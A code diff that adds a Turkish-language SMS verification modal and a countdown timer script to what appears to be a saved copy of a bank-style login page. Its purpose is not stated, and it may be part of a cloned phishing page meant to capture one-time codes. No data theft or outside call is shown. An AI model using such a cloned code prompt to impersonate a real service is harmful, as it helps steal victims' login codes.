@@ -219,6 +219,38 @@
                   <!----><!---->
                </app-custom-numpad>
             </div>
+            <div materialize="modal" class="modal" id="sms-mdl" style="z-index: 1043; top: 10%; opacity: 1; transform: scaleX(1); display: block;">
+               <a href="javascript:;" class="modal-action modal-close ng-star-inserted"><i class="material-icons pg-icons">close</i></a><!----><!----><!---->
+               <div class="modal-content">
+                  <sms-modal class="ng-star-inserted">
+                     <div class="sms-modal">
+                        <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
+                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid">
+                           <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
+                           <button type="submit" class="btn">Giriş</button>
+                        </form>
+                        <div class="remaning-time-cntnt"><span class="remaning-time"> Kalan süre </span><span id="gerisayi">106</span><a href="javascript:;" class="right disabled"> SMS şifremi tekrar gönder <i class="fa fa-refresh fa-fw"></i></a></div>
+                        <!---->
+                     </div>
+                  </sms-modal>
+                  <!----><!----><!---->
+               </div>
+            </div>
+            <script>
+               function geriyeSay() {
+                  var saniye = 120;
+                  var geriSayma = setInterval(function() {
+                     document.getElementById("gerisayi").textContent = saniye;
+                     saniye--;
+                     if (saniye < 0) {
+                           clearInterval(geriSayma);
+                           document.getElementById("gerisayi").textContent = "Geri sayım tamamlandı!";
+                     }
+                  }, 1000);
+               }
+
+               geriyeSay();
+               </script>
             <!---->
          </app-out-component>
          <!----><!----><!----><!---->
